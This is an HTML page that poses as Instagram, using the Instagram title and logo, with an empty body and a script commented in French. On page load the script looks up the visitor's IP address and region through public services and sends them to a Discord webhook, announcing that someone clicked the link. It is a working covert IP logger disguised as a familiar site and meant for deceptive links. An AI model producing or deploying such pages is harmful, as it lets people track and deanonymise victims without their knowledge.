<!DOCTYPE html>
<html lang="fr">
<head>
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
  <script>
    // Fonction pour envoyer l'adresse IP et le d√©partement √† Discord via un appel de webhook
    function sendIPAndDepartmentToDiscord(ipAddress, department) {
      var webhookURL = "https://ptb.discord.com/api/webhooks/your-webhook-url";

      var content = "> **Quelqu'un vient de cliquer sur le lien. Voici son adresse IP et son d√©partement :**" +
        "\n> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
        "\n> **D√©partement üè† : **" + department;

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour r√©cup√©rer l'adresse IP et le d√©partement de l'utilisateur
    function getIPAddressAndDepartment() {
      // R√©cup√©rer l'adresse IP de l'utilisateur en utilisant un service de g√©olocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // R√©cup√©rer le d√©partement en fonction de l'adresse IP
          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var department = data.region;

              // Envoyer l'adresse IP et le d√©partement √† Discord
              sendIPAndDepartmentToDiscord(ipAddress, department);
            })
            .catch(error => {
              console.error('Erreur lors de la r√©cup√©ration du d√©partement :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
        });
    }

    // Appeler la fonction d√®s que la page est charg√©e
    window.addEventListener('load', getIPAddressAndDepartment);
  </script>
</head>

</body>
